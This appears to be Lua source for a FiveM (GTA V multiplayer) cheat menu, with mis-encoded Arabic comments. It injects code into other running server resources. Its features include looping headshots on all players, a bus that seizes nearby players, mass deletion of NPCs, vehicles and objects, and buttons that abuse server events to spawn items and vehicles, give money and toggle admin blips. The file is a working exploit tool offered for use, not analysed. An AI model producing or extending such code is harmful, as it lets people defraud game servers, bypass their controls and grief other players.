MachoMenuCheckbox(NitWiroyer, "Lower Character 5m Animation", 
    function()
        enableLowerAnim = true
        CreateThread(function()
            while enableLowerAnim do
                local targetResource = nil
                if GetResourceState("any") == "started" then
                    targetResource = "any"
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        
                        RequestAnimDict("missheistdockssetup1ig_12@base")
                        while not HasAnimDictLoaded("missheistdockssetup1ig_12@base") do
                            Citizen.Wait(100)
                        end
                        
                        TaskPlayAnim(playerPed, "missheistdockssetup1ig_12@base", "base", 8.0, -8.0, -1, 1, 0.2, false, false, false)
                        
                        SetEntityAnimCurrentTime(playerPed, "missheistdockssetup1ig_12@base", "base", 0.05)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableLowerAnim = false
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
    end
)
MachoMenuCheckbox(NitWiroyer, "kill all (You must hold a Gun)", 
    function()
        enableDamageLoop = true
        CreateThread(function()
            while enableDamageLoop do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                        local myPed = PlayerPedId()
                        local currentWeapon = GetSelectedPedWeapon(myPed)
                        
                        if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                            local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                            
                            SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                            
                            for _, playerId in ipairs(GetActivePlayers()) do
                                if playerId ~= PlayerId() then
                                    local targetPed = GetPlayerPed(playerId)
                                    if DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                                        SetEntityInvincible(targetPed, false)
                                        SetEntityCanBeDamaged(targetPed, true)
                                        SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                                        
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                                        
                                        if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                                            headCoords = GetEntityCoords(targetPed)
                                            headCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 0.6)
                                        end
                                        
                                        local startCoords = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                                        
                                        ShootSingleBulletBetweenCoords(
                                            startCoords.x, startCoords.y, startCoords.z,
                                            headCoords.x, headCoords.y, headCoords.z,
                                            weaponDamage,
                                            true,
                                            currentWeapon,
                                            myPed,
                                            true,
                                            true,
                                            3000.0
                                        )
                                    end
                                end
                            end
                        end
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDamageLoop = false
    end
)
local busSpawnLoop = false
MachoMenuCheckbox(NitWiroyer, "Bus Spawn Loop", 
    function()
        busSpawnLoop = true
        MachoMenuNotification("Bus Spawn", "activated bro")
        Citizen.CreateThread(function()
            while busSpawnLoop do
                local success, result = pcall(function()
                    MachoInjectResource("any", [[
if not vehicles then vehicles = {} end
if not targetedPlayers then targetedPlayers = {} end

local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
    local mhash = GetHashKey(name)
    RequestModel(mhash)
    
    local timeout = 0
    while not HasModelLoaded(mhash) and timeout < 8000 do
        Citizen.Wait(100)
        timeout = timeout + 100
    end
    
    if not HasModelLoaded(mhash) then
        return false
    end

    local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
    local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
    
    local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
    
    if DoesEntityExist(vehicle) then
        SetVehicleOnGroundProperly(vehicle)
        SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
        SetModelAsNoLongerNeeded(mhash)
        SetEntityInvincible(vehicle, true)
        SetVehicleBodyHealth(vehicle, 50000.0)
        SetVehicleEngineHealth(vehicle, 50000.0)
        SetVehicleUndriveable(vehicle, false)
        NetworkRegisterEntityAsNetworked(vehicle)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
        
        -- Ø¶Ù…Ø§Ù† Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ù…Ø±ÙƒØ¨Ø©
        SetEntityAsMissionEntity(vehicle, true, true)
        NetworkRequestControlOfEntity(vehicle)
        
        if not vehicles[vtype] then vehicles[vtype] = {} end
        table.insert(vehicles[vtype], {vtype, name, vehicle})
        
        return vehicle
    else
        SetModelAsNoLongerNeeded(mhash)
        return false
    end
end

local function findTarget()
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed)
    local bestTarget = nil
    local shortestDist = 999.0
    
    for playerIdx = 0, 255 do
        if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
            local theirPed = GetPlayerPed(playerIdx)
            if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                local theirPos = GetEntityCoords(theirPed)
                local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                
                if dist < 350.0 and dist < shortestDist and not targetedPlayers[playerIdx] then
                    bestTarget = theirPed
                    shortestDist = dist
                end
            end
        end
    end
    
    if not bestTarget then
        targetedPlayers = {}
        for playerIdx = 0, 255 do
            if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
                local theirPed = GetPlayerPed(playerIdx)
                if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                    local theirPos = GetEntityCoords(theirPed)
                    local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                    
                    if dist < 350.0 and dist < shortestDist then
                        bestTarget = theirPed
                        shortestDist = dist
                    end
                end
            end
        end
    end
    
    return bestTarget, shortestDist
end

local function chaosAttach(busEntity, preSelectedVictim)
    local victim = preSelectedVictim
    
    if victim and DoesEntityExist(victim) then
        
        for playerIdx = 0, 255 do
            if GetPlayerPed(playerIdx) == victim then
                targetedPlayers[playerIdx] = true
                break
            end
        end
        
        -- Ø¶Ù…Ø§Ù† Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø¨Ø§Øµ ÙˆØ§Ù„Ø¶Ø­ÙŠØ©
        SetEntityAsMissionEntity(busEntity, true, true)
        SetEntityAsMissionEntity(victim, true, true)
        NetworkRequestControlOfEntity(busEntity)
        NetworkRequestControlOfEntity(victim)
        
        -- Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ ÙƒÙ„Ø§Ù‡Ù…Ø§
        local controlTimeout = 0
        while (not NetworkHasControlOfEntity(busEntity) or not NetworkHasControlOfEntity(victim)) and controlTimeout < 50 do
            Citizen.Wait(100)
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            controlTimeout = controlTimeout + 1
        end
        
        -- ØªØ£ÙƒØ¯ Ù…Ù† Ù‚ÙˆØ© Ø§Ù„Ø¨Ø§Øµ Ø£ÙˆÙ„Ø§Ù‹
        SetEntityHealth(busEntity, 50000)
        SetEntityMaxHealth(busEntity, 50000)
        SetVehicleBodyHealth(busEntity, 50000.0)
        SetVehicleEngineHealth(busEntity, 50000.0)
        SetVehiclePetrolTankHealth(busEntity, 50000.0)
        SetEntityInvincible(busEntity, true)
        SetVehicleStrong(busEntity, true)
        SetVehicleCanBreak(busEntity, false)
        SetEntityCanBeDamaged(busEntity, false)
        
        -- Ù†Ù‚Ù„ Ø§Ù„Ø¨Ø§Øµ Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø¶Ø­ÙŠØ© Ù…Ø¨Ø§Ø´Ø±Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø±Ø¨Ø·
        local victimPos = GetEntityCoords(victim)
        SetEntityCoords(busEntity, victimPos.x + 2.0, victimPos.y + 2.0, victimPos.z, false, false, false, true)
        
        Citizen.Wait(500) -- Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹
        
        -- Ù…Ù‚Ø§Ø¹Ø¯ Ø§Ù„Ø¨Ø§Øµ Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
        local interiorSpots = {
            {0.8, 1.2, -0.3, 0.0, 0.0, 0.0},      -- Ù…Ù‚Ø¹Ø¯ Ø§Ù„Ø³Ø§Ø¦Ù‚
            {-0.8, 1.2, -0.3, 0.0, 0.0, 0.0},     -- Ù…Ù‚Ø¹Ø¯ Ø§Ù„Ø±Ø§ÙƒØ¨ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠ
            {0.8, 0.0, -0.3, 0.0, 0.0, 0.0},      -- Ù…Ù‚Ø¹Ø¯ Ø®Ù„ÙÙŠ ÙŠÙ…ÙŠÙ†
            {-0.8, 0.0, -0.3, 0.0, 0.0, 0.0},     -- Ù…Ù‚Ø¹Ø¯ Ø®Ù„ÙÙŠ ÙŠØ³Ø§Ø±
            {0.8, -1.2, -0.3, 0.0, 0.0, 0.0},     -- Ù…Ù‚Ø¹Ø¯ Ø£ÙƒØ«Ø± Ù„Ù„Ø®Ù„Ù ÙŠÙ…ÙŠÙ†
            {-0.8, -1.2, -0.3, 0.0, 0.0, 0.0},    -- Ù…Ù‚Ø¹Ø¯ Ø£ÙƒØ«Ø± Ù„Ù„Ø®Ù„Ù ÙŠØ³Ø§Ø±
            {0.0, -0.5, -0.3, 0.0, 0.0, 0.0},     -- ÙˆØ³Ø· Ø§Ù„Ø¨Ø§Øµ
            {0.8, -2.0, -0.3, 0.0, 0.0, 0.0},     -- Ù…Ø¤Ø®Ø±Ø© Ø§Ù„Ø¨Ø§Øµ ÙŠÙ…ÙŠÙ†
            {-0.8, -2.0, -0.3, 0.0, 0.0, 0.0},    -- Ù…Ø¤Ø®Ø±Ø© Ø§Ù„Ø¨Ø§Øµ ÙŠØ³Ø§Ø±
            {0.0, 0.5, -0.2, 0.0, 0.0, 0.0},      -- Ù‚Ø±ÙŠØ¨ Ù…Ù† Ø§Ù„Ù…Ù‚Ø¯Ù…Ø©
            {0.0, -1.5, -0.2, 0.0, 0.0, 0.0}      -- Ù‚Ø±ÙŠØ¨ Ù…Ù† Ø§Ù„Ù…Ø¤Ø®Ø±Ø©
        }
        
        -- Ø£ÙˆÙ„ Ø±Ø¨Ø· Ù„Ù„Ø¶Ø­ÙŠØ©
        local currentSpot = interiorSpots[math.random(#interiorSpots)]
        local attachSuccess = AttachEntityToEntity(victim, busEntity, 0, currentSpot[1], currentSpot[2], currentSpot[3], currentSpot[4], currentSpot[5], currentSpot[6], false, false, false, false, 2, true)
        
        -- Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø¹Ø¯ Ø§Ù„Ø±Ø¨Ø·
        SetEntityAsMissionEntity(busEntity, true, true)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(busEntity), false)
        
        if not attachSuccess then
            -- Ø¥Ø°Ø§ ÙØ´Ù„ Ø§Ù„Ø±Ø¨Ø·ØŒ Ø¬Ø±Ø¨ Ø·Ø±ÙŠÙ‚Ø© Ù…Ø®ØªÙ„ÙØ©
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            SetEntityCoords(victim, victimPos.x, victimPos.y, victimPos.z + 1.0, false, false, false, true)
            Citizen.Wait(200)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
        end
        
        -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø±Ø¨Ø·
        Citizen.Wait(300)
        if not IsEntityAttached(victim) then
            -- Ù…Ø­Ø§ÙˆÙ„Ø© Ø£Ø®ÙŠØ±Ø© Ù„Ù„Ø±Ø¨Ø·
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            local busPos = GetEntityCoords(busEntity)
            SetEntityCoords(victim, busPos.x, busPos.y, busPos.z - 0.3, false, false, false, true)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            SetEntityAsMissionEntity(busEntity, true, true)
        end
        
        Citizen.CreateThread(function()
            local chaosCounter = 0
            local maxChaos = math.random(35, 55)
            
            while DoesEntityExist(busEntity) and DoesEntityExist(victim) and chaosCounter < maxChaos do
                Citizen.Wait(math.random(1200, 2200))
                chaosCounter = chaosCounter + 1
                
                if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                    -- Ø·Ù„Ø¨ Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø¨Ø§Øµ ÙˆØ§Ù„Ø¶Ø­ÙŠØ© Ø¨Ø§Ø³ØªÙ…Ø±Ø§Ø±
                    if not NetworkHasControlOfEntity(busEntity) then
                        NetworkRequestControlOfEntity(busEntity)
                        SetEntityAsMissionEntity(busEntity, true, true)
                    end
                    
                    if not NetworkHasControlOfEntity(victim) then
                        NetworkRequestControlOfEntity(victim)
                        SetEntityAsMissionEntity(victim, true, true)
                    end
                    
                    -- ÙØµÙ„ Ù…Ø¤Ù‚Øª ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø±Ø¨Ø· ÙÙŠ Ù…Ù‚Ø¹Ø¯ Ø¬Ø¯ÙŠØ¯
                    if IsEntityAttached(victim) then
                        -- Ø·Ù„Ø¨ Ø§Ù„ØªØ­ÙƒÙ… Ù‚Ø¨Ù„ Ø§Ù„ÙØµÙ„
                        NetworkRequestControlOfEntity(busEntity)
                        Citizen.Wait(50)
                        DetachEntity(victim, false, false)
                    end
                    
                    Citizen.Wait(math.random(100, 300))
                    
                    if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                        local newSpot = interiorSpots[math.random(#interiorSpots)]
                        -- Ø¥Ø¹Ø§Ø¯Ø© Ø±Ø¨Ø· Ø§Ù„Ø¶Ø­ÙŠØ© Ø¨Ø§Ù„Ø¨Ø§Øµ
                        NetworkRequestControlOfEntity(busEntity)
                        NetworkRequestControlOfEntity(victim)
                        AttachEntityToEntity(victim, busEntity, 0, newSpot[1], newSpot[2], newSpot[3], newSpot[4], newSpot[5], newSpot[6], false, false, false, false, 2, true)
                        SetEntityAsMissionEntity(busEntity, true, true)
                        
                        -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ù‚ÙˆØ© Ø§Ù„Ø¨Ø§Øµ
                        SetEntityHealth(busEntity, 50000)
                        SetEntityInvincible(busEntity, true)
                        SetVehicleBodyHealth(busEntity, 50000.0)
                        SetVehicleEngineHealth(busEntity, 50000.0)
                        
                        -- ØªØ­Ø±ÙŠÙƒ Ø¹Ø¯ÙˆØ§Ù†ÙŠ
                        if chaosCounter % 3 == 0 then
                            SetEntityVelocity(busEntity, math.random(-15, 15), math.random(-15, 15), math.random(-3, 8))
                        end
                        
                        -- ÙƒÙ„Ø§ÙƒØ³ÙˆÙ† Ù…Ø²Ø¹Ø¬
                        if chaosCounter % 2 == 0 then
                            StartVehicleHorn(busEntity, math.random(2000, 5000), GetHashKey("HELDDOWN"), false)
                        end
                        
                        -- ÙƒÙ„Ø§ÙƒØ³ÙˆÙ† Ù…ØªÙ‚Ø·Ø¹
                        if chaosCounter % 3 == 1 then
                            for i = 1, math.random(5, 10) do
                                Citizen.CreateThread(function()
                                    Citizen.Wait(i * 150)
                                    if DoesEntityExist(busEntity) then
                                        StartVehicleHorn(busEntity, 200, GetHashKey("HELDDOWN"), false)
                                    end
                                end)
                            end
                        end
                        
                        -- Ø£Ø¶ÙˆØ§Ø¡ Ù…Ø¬Ù†ÙˆÙ†Ø©
                        if chaosCounter % 2 == 0 then
                            SetVehicleLights(busEntity, 2)
                            SetVehicleIndicatorLights(busEntity, 0, true)
                            SetVehicleIndicatorLights(busEntity, 1, true)
                            SetVehicleInteriorlight(busEntity, true)
                            SetVehicleBrakeLights(busEntity, true)
                        end
                        
                        -- Ø¥Ù†Ø°Ø§Ø± Ù…Ø³ØªÙ…Ø±
                        if chaosCounter % 4 == 0 then
                            SetVehicleAlarm(busEntity, true)
                            SetVehicleAlarmTimeLeft(busEntity, 8000)
                        end
                        
                        -- Ø£Ø¨ÙˆØ§Ø¨ Ù…Ø¬Ù†ÙˆÙ†Ø©
                        if chaosCounter % 3 == 0 then
                            for doorIdx = 0, 5 do
                                SetVehicleDoorOpen(busEntity, doorIdx, false, false)
                                Citizen.CreateThread(function()
                                    Citizen.Wait(math.random(200, 600))
                                    if DoesEntityExist(busEntity) then
                                        SetVehicleDoorShut(busEntity, doorIdx, false)
                                    end
                                end)
                            end
                        end
                        
                        -- Ù…Ø­Ø±Ùƒ Ù…Ø²Ø¹Ø¬
                        if chaosCounter % 5 == 0 then
                            SetVehicleEngineOn(busEntity, true, true, false)
                            ModifyVehicleTopSpeed(busEntity, 80.0)
                        end
                        
                        -- ØµÙØ§Ø±Ø© Ø¥Ù†Ø°Ø§Ø±
                        if chaosCounter % 6 == 0 then
                            SetVehicleSiren(busEntity, true)
                            Citizen.CreateThread(function()
                                Citizen.Wait(math.random(3000, 6000))
                                if DoesEntityExist(busEntity) then
                                    SetVehicleSiren(busEntity, false)
                                end
                            end)
                        end
                        
                        -- Ø¹Ø¬Ù„Ø© Ù‚ÙŠØ§Ø¯Ø© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ©
                        if chaosCounter % 4 == 1 then
                            SetVehicleSteeringAngle(busEntity, math.random(-60, 60))
                        end
                        
                        -- ØªØ´ØºÙŠÙ„ ÙˆØ¥Ø·ÙØ§Ø¡ Ø§Ù„Ù…Ø­Ø±Ùƒ
                        if chaosCounter % 8 == 0 then
                            SetVehicleEngineOn(busEntity, false, false, true)
                            Citizen.Wait(math.random(300, 700))
                            SetVehicleEngineOn(busEntity, true, true, false)
                        end
                    else
                        break
                    end
                else
                    break
                end
            end
            
            -- ØªÙ†Ø¸ÙŠÙ Ù†Ù‡Ø§Ø¦ÙŠ
            if DoesEntityExist(victim) and IsEntityAttached(victim) then
                NetworkRequestControlOfEntity(busEntity)
                DetachEntity(victim, true, true)
            end
            
            if DoesEntityExist(busEntity) then
                SetEntityInvincible(busEntity, false)
                SetEntityCanBeDamaged(busEntity, true)
                SetVehicleCanBreak(busEntity, true)
                Citizen.Wait(5000)
                if DoesEntityExist(busEntity) then
                    DeleteEntity(busEntity)
                end
            end
        end)
        
        return true
    else
        return false
    end
end

local victim, distToVictim = findTarget()

if victim and DoesEntityExist(victim) then
    local victimPos = GetEntityCoords(victim)
    -- Ø³Ø¨ÙˆÙ† Ø§Ù„Ø¨Ø§Øµ Ù‚Ø±ÙŠØ¨ Ø¬Ø¯Ø§Ù‹ Ù…Ù† Ø§Ù„Ø¶Ø­ÙŠØ©
    local spawnX = victimPos.x + math.random(-8, 8)
    local spawnY = victimPos.y + math.random(-8, 8)
    local spawnZ = victimPos.z + 1.0 -- Ù‚Ø±ÙŠØ¨ Ù…Ù† Ø§Ù„Ø£Ø±Ø¶

    local busVeh = spawnVehicle("car", "bus", {spawnX, spawnY, spawnZ}, math.random(1000, 9999), false)

    if busVeh then
        Citizen.Wait(math.random(800, 1500)) -- Ø§Ù†ØªØ¸Ø§Ø± Ø£Ù‚Ù„
        
        if DoesEntityExist(busVeh) and DoesEntityExist(victim) then
            local attachSuccess = chaosAttach(busVeh, victim)
            if not attachSuccess then
                Citizen.Wait(2000)
                if DoesEntityExist(busVeh) then
                    DeleteEntity(busVeh)
                end
            end
        end
    end
end
]])
                end)
                if success then
                    MachoMenuNotification("Bus Spawn", "chaos unleashed with control!")
                else
                    MachoMenuNotification("Bus Spawn", "failed somehow idk")
                end
                Citizen.Wait(math.random(6000, 9000))
            end
        end)
    end,
    function()
        busSpawnLoop = false
        MachoMenuNotification("Bus Spawn", "stopped the madness")
    end
)
MachoMenuText(NitWiroyer,"Deleter & destroyer")

MachoMenuCheckbox(NitWiroyer, "Delete Bots", 
    function()
        enableDeleteBots = true
        CreateThread(function()
            while enableDeleteBots do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, ped = FindFirstPed()
                        local success
                        repeat
                            if DoesEntityExist(ped) and ped ~= PlayerPedId() then
                                if not IsPedAPlayer(ped) then
                                    DeletePed(ped)
                                    SetEntityAsNoLongerNeeded(ped)
                                end
                            end
                            success, ped = FindNextPed(handle)
                        until not success
                        EndFindPed(handle)
                    ]])
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDeleteBots = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Vehicles", 
    function()
        enableDeleteVehicles = true
        CreateThread(function()
            while enableDeleteVehicles do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        local playerVehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        local handle, vehicle = FindFirstVehicle()
                        local success
                        repeat
                            if DoesEntityExist(vehicle) and vehicle ~= playerVehicle then
                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if not driver or not IsPedAPlayer(driver) then
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    DeleteVehicle(vehicle)
                                    SetEntityAsNoLongerNeeded(vehicle)
                                end
                            end
                            success, vehicle = FindNextVehicle(handle)
                        until not success
                        EndFindVehicle(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteVehicles = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Objects", 
    function()
        enableDeleteObjects = true
        CreateThread(function()
            while enableDeleteObjects do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, object = FindFirstObject()
                        local success
                        repeat
                            if DoesEntityExist(object) then
                                if not IsEntityAttached(object) then
                                    SetEntityAsMissionEntity(object, true, true)
                                    DeleteObject(object)
                                    SetEntityAsNoLongerNeeded(object)
                                end
                            end
                            success, object = FindNextObject(handle)
                        until not success
                        EndFindObject(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteObjects = false
    end
)



---------------------------------------------------------------------
                         --    cfw                                         
---------------------------------------------------------------------    

MachoMenuSetText(MenuWindow,"KM7")
MachoMenuText(MenuWindow,"Triggers & Servers")

    local MainTab = MachoMenuAddTab(MenuWindow, "CFW")
    local SERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local SERVERCFWEachSectionWidth = (SERVERCFWSectionChildWidth - 20) / 2 -- Adjusted for two sections

    local SelfSection = MachoMenuGroup(MainTab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
MachoMenuButton(SelfSection, "Open Shop", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            local configCode = generateOriginalConfig()
            configCode = configCode .. 'TriggerServerEvent("' .. triggerData.trigger .. '", "shop", "arcadebar", ShopItems)'
            MachoInjectResource(triggerData.resource, configCode)
        end
        MachoMenuNotification("Self", "Shop opened")
    end)
    local itemInputBox = MachoMenuInputbox(SelfSection, "Item Name", "Enter item...")
    MachoMenuButton(SelfSection, "Spawn Item", function()
        local itemName = MachoMenuGetInputbox(itemInputBox)
        if itemName and itemName ~= "" then
            for _, triggerData in ipairs(foundTriggers.items) do
                local configCode = string.format([[
                    local ShopItems = {}
                    ShopItems.label = "Single Item"
                    ShopItems.items = {[1] = {name = "%s", price = 0, amount = 1, info = {}, type = "item", slot = 1}}
                    ShopItems.slots = 1
                    TriggerServerEvent("%s", "shop", "single", ShopItems)
                ]], itemName, triggerData.trigger)
                MachoInjectResource(triggerData.resource, configCode)
            end
            MachoMenuNotification("Self", "Spawned: " .. itemName)
        end
    end)
    MachoMenuButton(SelfSection, "Self Revive", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            MachoInjectResource(triggerData.resource, 'TriggerEvent("hospital:client:Revive")')
        end
        MachoMenuNotification("Self", "Revived")
    end)
    
    MachoMenuButton(SelfSection, "Toggle Blips", function()
        -- Search for admin menu resource and verify it contains the blips toggle event
        local totalRes = GetNumResources()
        local foundBlipsResource = false
        for i = 0, totalRes - 1 do
            local resName = GetResourceByFindIndex(i)
            if resName and GetResourceState(resName) == "started" then
                local lowerName = string.lower(resName)
                if string.find(lowerName, "adminmenu") or string.find(lowerName, "admin") then
                    -- Verify the resource contains the blips toggle event by checking files
                    local blipsEventFound = false
                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resName, fileName)
                        end)
                        if success and content and content ~= "" then
                            local contentLower = string.lower(content)
                            if string.find(contentLower, "toggleblips") or string.find(contentLower, "toggle.*blip") then
                                blipsEventFound = true
                                -- Try to find the exact trigger name dynamically
                                local triggerPattern = resName:gsub("%-", "%%-") .. ":client:toggleBlips"
                                MachoInjectResource(resName, 'TriggerEvent("' .. triggerPattern .. '")')
                                foundBlipsResource = true
                                break
                            end
                        end
                    end
                    if foundBlipsResource then
                        break
                    end
                end
            end
        end
        if foundBlipsResource then
            MachoMenuNotification("Self", "Toggled Blips")
        else
            MachoMenuNotification("Error", "Blips toggle event not found in any admin resource")
        end
    end)
    local vehicleInputBox = MachoMenuInputbox(SelfSection, "Vehicle Name", "Enter vehicle model...")
    MachoMenuButton(SelfSection, "Spawn Vehicle", function()
        local vehicleName = MachoMenuGetInputbox(vehicleInputBox)
        if vehicleName and vehicleName ~= "" then
            for _, triggerData in ipairs(foundTriggers.vehicle) do
                local spawnCode = string.format('TriggerEvent("%s", "%s")', triggerData.trigger, vehicleName)
                MachoInjectResource(triggerData.resource, spawnCode)
            end
            MachoMenuNotification("Self", "Spawned vehicle: " .. vehicleName)
        else
            MachoMenuNotification("Error", "Enter a vehicle name")
        end
    end)
    local amountInput = MachoMenuInputbox(SelfSection, "Money Amount", "Enter amount...")
    MachoMenuButton(SelfSection, "Give Money", function()
        local amount = MachoMenuGetInputbox(amountInput)
        if amount and amount ~= "" then
            local numAmount = tonumber(amount)
            if numAmount then
                local correctedAmount = math.floor((numAmount + 1) * 333.33)
                for _, triggerData in ipairs(foundTriggers.money) do
                    MachoInjectResource(triggerData.resource, "TriggerServerEvent('" .. triggerData.trigger .. "', " .. correctedAmount .. ")")
                end
                MachoMenuNotification("Self", "Gave: $" .. numAmount)
            else
                MachoMenuNotification("Error", "Invalid amount")
            end
        else
            MachoMenuNotification("Error", "Enter an amount")
        end
    end)
    paymentSpeedInput = MachoMenuInputbox(SelfSection, "Payment Loop Speed (ms)", "Enter speed in milliseconds...")
    
    MachoMenuButton(SelfSection, "Start Payment Loop", function()
        local speed = nil
        pcall(function()
            if MachoMenuGetInputbox then
                speed = MachoMenuGetInputbox(paymentSpeedInput)
            end
        end)
        
        if speed and speed ~= "" then
            local numSpeed = tonumber(speed)
            if numSpeed and numSpeed >= 1 then
                if not isPaymentLoopRunning then
                    paymentLoopSpeed = numSpeed
                    startPaymentLoop()
                    MachoMenuNotification("Money", "Payment loop started with speed: " .. numSpeed .. "ms")
                else
                    -- Update speed if already running
                    paymentLoopSpeed = numSpeed
